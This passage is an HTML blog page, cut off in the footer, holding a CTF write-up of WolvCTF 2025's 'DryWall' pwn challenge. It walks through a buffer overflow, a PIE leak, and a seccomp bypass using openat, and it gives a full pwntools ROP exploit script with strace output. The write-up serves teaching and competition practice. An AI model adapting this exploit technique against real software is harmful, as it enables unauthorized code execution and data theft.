@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DryWall – writeup 🧱🔨 from Wolvctf | NopNop0x90 Blog</title>
+  <meta name="description" content="DryWall – writeup 🧱🔨 from Wolvctf">
+  
+  <!-- Preload critical resources -->
+  <link rel="preload" href="/assets/css/style.css" as="style">
+  <link rel="preload" href="/assets/images/background.webp" as="image">
+  <link rel="preload" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;700&display=swap" as="style">
+  
+  <!-- Favicon -->
+  <link rel="icon" href="/assets/images/logo.png" type="image/png">
+  
+  <!-- Theme Color -->
+  <meta name="theme-color" content="#0c0c14" media="(prefers-color-scheme: dark)">
+  <meta name="theme-color" content="#f0f0f5" media="(prefers-color-scheme: light)">
+  
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;700&display=swap">
+  
+  <!-- Open Graph -->
+  <meta property="og:title" content="DryWall – writeup 🧱🔨 from Wolvctf | NopNop0x90 Blog">
+  <meta property="og:description" content="DryWall – writeup 🧱🔨 from Wolvctf">
+  <meta property="og:image" content="/assets/images/OG.webp">
+  <meta property="og:url" content="https://nopnopx90.github.io/writeups/wolvctf-drywall/">
+  <meta property="og:type" content="website">
+  
+  
+</head>
+<body>
+  <!-- Progress bar for scrolling -->
+  <div class="progress-bar"></div>
+  
+  <!-- Hero banner with FRANXX aesthetic -->
+  <div class="banner">
+    <div class="banner-content">
+      <h1>
+        <a href="/">
+          <img src="/assets/images/logo.png" alt="NopNop0x90 Logo" class="logo">
+          <span class="site-title">
+            
+              NopNop0x90's Blog
+            
+          </span>
+        </a>
+      </h1>
+      
+    </div>
+  </div>
+  
+  <div class="container">
+    <header>
+      <div class="header-logo-nav">
+        <button class="mobile-menu-btn" aria-label="Toggle menu">☰</button>
+        <nav aria-label="Main navigation">
+          <ul>
+            <li><a href="/" class="nav-link">Home</a></li>
+            <li><a href="/archives" class="nav-link">Archives</a></li>
+            <li><a href="/about" class="nav-link">About</a></li>
+            <li><a href="/feed.xml" class="nav-link">RSS</a></li>
+          </ul>
+        </nav>
+      </div>
+      <div class="header-right">
+        <nav class="social-nav">
+          <a href="https://github.com/NopNopx90" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+            </svg>
+          </a>
+          <a href="https://x.com/NopNop0x90" target="_blank" rel="noopener noreferrer" aria-label="Twitter">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
+            </svg>
+          </a>
+        </nav>
+        <button id="theme-toggle" aria-label="Toggle dark mode">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        </button>
+      </div>
+    </header>
+
+    <main id="main-content">
+      <!-- FRANXX-style decorative divider before content -->
+      <div class="franxx-divider">
+        <span class="x-blue">X</span><span class="x-pink">X</span>
+      </div>
+      
+      <article class="post">
+  <header class="post-header">
+    <div class="start">
+      <h1 class="post-title">DryWall – writeup 🧱🔨 from Wolvctf</h1>
+      
+      
+        <a class="tag" href="/tag/userland">#userland</a>, 
+      
+        <a class="tag" href="/tag/pwn">#pwn</a>, 
+      
+        <a class="tag" href="/tag/binary-exploitation">#binary-exploitation</a>, 
+      
+        <a class="tag" href="/tag/ROP">#ROP</a>
+      
+      
+</p>
+    </div>
+    <div class="post-meta">
+      <span class="date">March 23, 2025</span>
+      
+        <span class="category">PWN</span>
+      
+      <span class="reading-time">
+        
+        9 min read
+      </span>
+      <img style="width: inherit;" src="https://hitscounter.dev/api/hit?url=https%3A%2F%2Fnopnopx90.github.io%2F/writeups/wolvctf-drywall/%2F&label=Views&icon=eye&color=%23ff4170&message=&style=for-the-badge&tz=UTC">
+    </div>
+  </header>
+
+  <div class="post-content">
+    <p class="post-description">Detailed writeup of the Drywall challenge from WolvCTF 2025 covering ROP chain development and exploit mitigation bypass.</p>
+    <h1 id="drywall--writeup--from-wolvctf">DryWall – writeup 🧱🔨 from Wolvctf</h1>
+
+<p><strong>Challenge Name</strong>: DryWall
+<strong>Category</strong>: Pwn Userland</p>
+
+<hr />
+
+<h2 id="tldr">TL;DR</h2>
+<p>We bypassed the seccomp , leaked the PIE base, built a ROP chain to <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">write</code> the flag file directly, all while staying within syscall restrictions. Oh, and no <code class="language-plaintext highlighter-rouge">open()</code> allowed. Time for <code class="language-plaintext highlighter-rouge">openat()</code> magic.</p>
+
+<hr />
+<h2 id="disclaimer--horrible-scripting-ahead-d">Disclaimer : Horrible scripting ahead :D</h2>
+
+<h2 id="peeking-at-the-source">Peeking at the Source</h2>
+
+<p>Here’s the key section from the provided C code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+<span class="p">...</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Good luck %s &lt;|;)</span><span class="err">
+</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">main</span><span class="p">);</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><strong>buffer overflow?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">char buf[256];</code> is fed into <code class="language-plaintext highlighter-rouge">fgets(buf, 0x256, stdin);</code></li>
+  <li>But 0x256 = 598 bytes are read into a 256-byte buffer.</li>
+  <li>Classic <strong>buffer overflow</strong> and more than enough room to build a ROP chain.</li>
+</ul>
+
+<hr />
+
+<h2 id="seccomp">Seccomp</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">execve</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">open</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">...</span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">process_vm_writev</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Basically, they blocked:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">execve</code>, <code class="language-plaintext highlighter-rouge">open</code>, <code class="language-plaintext highlighter-rouge">execveat</code></li>
+  <li>Variants of <code class="language-plaintext highlighter-rouge">readv</code>, <code class="language-plaintext highlighter-rouge">writev</code>, <code class="language-plaintext highlighter-rouge">process_vm_*</code></li>
+</ul>
+
+<p>But they <em>didn’t block</em>:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openat</code></li>
+  <li><code class="language-plaintext highlighter-rouge">read</code></li>
+  <li><code class="language-plaintext highlighter-rouge">write</code></li>
+</ul>
+
+<p>We can work with this.</p>
+
+<hr />
+
+<h2 id="the-plan">The Plan</h2>
+
+<p>Here’s what we need to do:</p>
+<ol>
+  <li><strong>Leak the PIE base</strong></li>
+  <li><strong>Find or inject the flag file path</strong> – <code class="language-plaintext highlighter-rouge">/home/user/flag.txt</code></li>
+  <li><strong>Build ROP chain</strong> using <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">write</code> since <code class="language-plaintext highlighter-rouge">open()</code> is blocked.</li>
+  <li><strong>Exploit the buffer overflow</strong> to hijack control flow.</li>
+</ol>
+
+<hr />
+
+<h2 id="pie-base-leak">PIE Base Leak</h2>
+
+<p>From the binary:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">main</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Nice. They’re handing us the address of <code class="language-plaintext highlighter-rouge">main</code> post-PIE randomization. With that, we can calculate the binary’s base.</p>
+
+<p>In the exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">main_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">main_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">main_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">binary_base</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">main_offset</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="injecting-the-flag-path">Injecting the Flag Path</h2>
+
+<p>Here’s the fun part – the program asks for your name first.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"What is your name, epic H4x0r?"</span><span class="p">);</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We can directly feed <code class="language-plaintext highlighter-rouge">/home/user/flag.txt\0</code> into the <code class="language-plaintext highlighter-rouge">name</code> buffer. Since we know <code class="language-plaintext highlighter-rouge">name</code> is global (<code class="language-plaintext highlighter-rouge">.bss</code>) and we can compute its runtime address, we just point <code class="language-plaintext highlighter-rouge">openat()</code> to it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -t chall | grep name 
+0000000000004050 l     O .bss	000000000000001e              _ZL4name
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="rop-time--cracking-the-wall">ROP Time – Cracking the Wall</h2>
+
+<p>We’re now ready to build our ROP chain.</p>
+
+<h3 id="openatat_fdcwd-name_addr-o_rdonly">openat(AT_FDCWD, name_addr, O_RDONLY)</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">AT_FDCWD</code> is -100 → <code class="language-plaintext highlighter-rouge">0xffffff9c</code></li>
+  <li>syscall number for <code class="language-plaintext highlighter-rouge">openat</code> → 257</li>
+  <li>We’re using <strong>syscall gadget</strong> (gifted in the binary via <code class="language-plaintext highlighter-rouge">gift()</code> function!)</li>
+</ul>
+
+<h3 id="read3-name_addr-0x100">read(3, name_addr, 0x100)</h3>
+
+<ul>
+  <li>FD = 3 → file descriptor returned from <code class="language-plaintext highlighter-rouge">openat</code></li>
+</ul>
+
+<h3 id="write1-name_addr-0x100">write(1, name_addr, 0x100)</h3>
+
+<ul>
+  <li>Write flag contents to stdout.</li>
+</ul>
+
+<p>ROP chain:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AT_FDCWD</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># junk for r15
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">O_RDONLY</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">257</span><span class="p">)</span>  <span class="c1"># openat
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># syscall read
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># syscall write
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="payload-assembly">Payload Assembly</h2>
+
+<p>Buffer overflow kicks in here:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">280</span>  <span class="c1"># Offset to return address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span>
+</code></pre></div></div>
+
+<p>After sending this, we enter <strong>interactive mode</strong> and get the flag.</p>
+
+<hr />
+
+<h2 id="complete-exploit-script">Complete exploit script:</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chall</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">info</span><span class="sh">'</span> 
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="c1">#p = remote('ip_addr', port)
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">What is your name, epic H4x0r?</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/home/user/flag.txt</span><span class="se">\0</span><span class="sh">'</span><span class="p">)</span> 
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&lt;|;)</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">main_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">main_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Leaked main address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">main_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">binary_base</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">main_offset</span>
+<span class="n">name_offset</span> <span class="o">=</span> <span class="mh">0x4050</span>
+<span class="n">name_addr</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="n">name_offset</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">PIE base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">name address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Gadgets
+</span><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x13db</span>
+<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x1199</span>
+<span class="n">pop_rsi_pop_r15_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x13d9</span>
+<span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x119b</span>
+<span class="n">syscall_ret</span> <span class="o">=</span> <span class="n">binary_base</span> <span class="o">+</span> <span class="mh">0x119d</span>
+
+<span class="n">AT_FDCWD</span> <span class="o">=</span> <span class="o">-</span><span class="mi">100</span>  <span class="c1"># 0xffffff9c for openat
+</span><span class="n">O_RDONLY</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># ROP chain
+</span><span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
+
+<span class="c1"># openat(AT_FDCWD, name_addr, O_RDONLY)
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AT_FDCWD</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># junk for r15
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">O_RDONLY</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">257</span><span class="p">)</span>  <span class="c1"># openat
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="c1"># read and write
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># syscall read
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># syscall write
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">280</span>  
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag-in-sight-">Flag in Sight! 🎯</h2>
+
+<p>Running the exploit…</p>
+
+<p><img src="/assets/images/exploits/drywall.png" alt="exploit screenshot" /></p>
+
+<p>Mission accomplished.</p>
+
+<hr />
+
+<h2 id="locally-testing-syscalls">Locally Testing Syscalls</h2>
+
+<p>To check if <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">write</code> are functioning correctly, you can run the exploit locally with <code class="language-plaintext highlighter-rouge">strace</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace <span class="nt">-f</span> <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span>openat,read,write python3 local.py
+</code></pre></div></div>
+
+<p>Sample output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[pid 124153] openat(-1709061504, "/home/user/flag.txt", O_RDONLY) = 3
+[pid 124153] read(3, "{Fake_flag}\n", 256) = 12
+[pid 124153] write(1, "{Fake_flag}\nflag.txt\0\n\0\0\0..."..., 256) = 256
+[pid 124153] --- SIGSEGV ---
+[pid 124154] read(8, "{Fake_flag}\nflag.txt\0\n\0..."..., 4096) = 256
+{Fake_flag}
+[pid 124154] write(1, "{Fake_flag}"..., ...) = 22
+</code></pre></div></div>
+
+<p>This helps verify syscall correctness before trying on remote.</p>
+
+<hr />
+
+
+  </div>
+
+  <div class="post-navigation">
+    
+      <a class="prev" href="/writeups/QuackQuack-apocalypseCTF/">&laquo; Quack Quack - from ApocalypseCTF</a>
+    
+    
+  </div>
+</article>
+
+      
+      <!-- FRANXX-style decorative divider after content -->
+      <div class="franxx-divider">
+        <span class="x-blue">X</span><span class="x-pink">X</span>
+      </div>
+      
+      <!-- Pagination for home and archives pages -->
+      
+    </main>
+
+    <footer>
+      <div class="footer-content">
+        <div class="footer-links">
+          <a href="https://github.com/NopNopx90" target="_blank" rel="noopener noreferrer">
+            <svg class="social-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
